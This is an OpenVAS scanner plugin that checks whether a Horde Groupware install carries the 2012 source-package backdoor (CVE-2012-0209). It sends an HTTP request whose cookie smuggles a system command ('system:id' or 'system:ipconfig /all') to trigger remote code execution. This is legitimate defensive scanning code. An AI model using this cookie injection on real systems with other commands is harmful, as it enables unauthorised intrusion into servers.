###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_horde_backdoor_51989.nasl 12 2013-10-27 11:15:33Z jan $
#
# Horde Groupware Source Packages Backdoor Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Horde Groupware is prone to a backdoor vulnerability.

Attackers can exploit this issue to execute arbitrary code in the
context of the application. Successful attacks will compromise the
affected application.

Horde Groupware versions 1.2.10 between November 2, 2011, and February
7, 2012, are vulnerable.";

tag_solution = "The vendor released an update. Please see the references for details.";

if (description)
{
 script_id(103423);
 script_bugtraq_id(51989);
 script_cve_id("CVE-2012-0209");
 script_version ("$Revision: 12 $");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

 script_name("Horde Groupware Source Packages Backdoor Vulnerability");

desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;


 script_tag(name:"risk_factor", value:"High");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2012-02-16 09:13:01 +0100 (Thu, 16 Feb 2012)");
 script_description(desc);
 script_summary("Determine if Horde is installed with a backdoor");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("horde_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_keys("horde/installed");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/51989");
 script_xref(name : "URL" , value : "http://lists.horde.org/archives/announce/2012/000751.html");
 script_xref(name : "URL" , value : "http://lists.horde.org/archives/announce/2012/000749.html");
 script_xref(name : "URL" , value : "http://lists.horde.org/archives/announce/2012/000750.html");
 script_xref(name : "URL" , value : "http://git.horde.org/diff.php/groupware/docs/groupware/CHANGES?rt=horde&amp;r1=1.38.2.16&amp;r2=1.38.2.17&amp;ty=h%27");
 script_xref(name : "URL" , value : "http://eromang.zataz.com/2012/02/15/cve-2012-0209-horde-backdoor-analysis/");
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("version_func.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

if(!dir = get_dir_from_kb(port:port,app:"horde"))exit(0);

host = get_host_name();

res = host_runs("windows");

if (res == "unknown") {
  cmds = make_array("system:id","uid=[0-9]+.*gid=[0-9]+.*","system:ipconfig /all","Subnet Mask");
} 
else if(res == "yes" ) {
  cmds = make_array("system:ipconfig /all","Subnet Mask");
}
else {  
  cmds = make_array("system:id","uid=[0-9]+.*gid=[0-9]+.*");
}  

url = string(dir, "/services/javascript.php?app=horde&file=open_calendar.js"); 

foreach cmd (keys(cmds)) {

  req = string("GET ", url, " HTTP/1.1\r\n",
               "Host: ", host, "\r\n",
               "Cookie: href=",cmd,"\r\n\r\n");

  res = http_send_recv(port:port, data:req);

  if(egrep(pattern:cmds[cmd], string:res)) {

    security_hole(port:port);
    exit(0);

  }  
}

exit(0);

